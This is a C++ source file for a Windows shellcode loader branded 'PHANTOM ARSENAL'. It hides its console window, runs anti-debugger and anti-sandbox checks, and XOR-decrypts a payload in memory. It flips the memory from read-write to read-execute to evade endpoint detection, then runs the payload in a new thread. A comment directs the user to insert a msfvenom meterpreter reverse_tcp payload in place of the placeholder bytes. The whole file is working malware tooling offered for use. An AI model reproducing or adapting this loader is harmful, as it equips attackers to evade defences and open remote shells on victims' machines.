#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// [!] PHANTOM ARSENAL - LETHAL C++ LOADER [!]
// Features: Anti-Debugging, XOR Payload Decryption, RW to RX Memory Allocation (Bypasses RWX scans)
// Execution: Self-Injection via Threading

// Simple Anti-Sandbox & Anti-Debugger Check
bool EnvCheck() {
    // 1. Check if debugger is attached
    if (IsDebuggerPresent()) return false;

    // 2. Check for CPU Cores (Sandboxes usually have 1 or 2)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return false;

    // 3. Check Memory (Sandboxes often have < 4GB)
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if ((statex.ullTotalPhys / 1024 / 1024 / 1024) < 2) return false;

    return true;
}

// Obfuscated Payload Execution
void Detonate(unsigned char* cipher, size_t size, char key) {
    // Allocate RW memory (Not RWX to avoid EDR heuristic triggers)
    void* exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Copy the encrypted payload into allocated memory
    RtlMoveMemory(exec_mem, cipher, size);
    
    // Decrypt the payload in memory (XOR)
    unsigned char* pBuffer = (unsigned char*)exec_mem;
    for (int i = 0; i < size; i++) {
        pBuffer[i] = pBuffer[i] ^ key;
    }

    // Flip memory protection to RX (Read-Execute) before running
    // This circumvents RWX (Read-Write-Execute) static memory sweeps
    DWORD oldProtect;
    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldProtect);

    // Execute via standard CreateThread
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
}

int main() {
    // Hide Console Window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Environment Validation - If sandbox detected, exit silently
    if (!EnvCheck()) {
        return 0; // Ghost mode
    }

    // Replace this array with your XOR encrypted shellcode
    // Example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f c
    // Then XOR the output bytes with your key.
    unsigned char payload[] = { 0x90, 0x90, 0x90, 0xcc }; // Placeholder: NOP NOP NOP INT3
    size_t payload_len = sizeof(payload);

    // Encryption Key used in XOR
    char key = 0x5A; // Using 'Z' as XOR key

    // Pull the trigger
    Detonate(payload, payload_len, key);

    return 0;
}
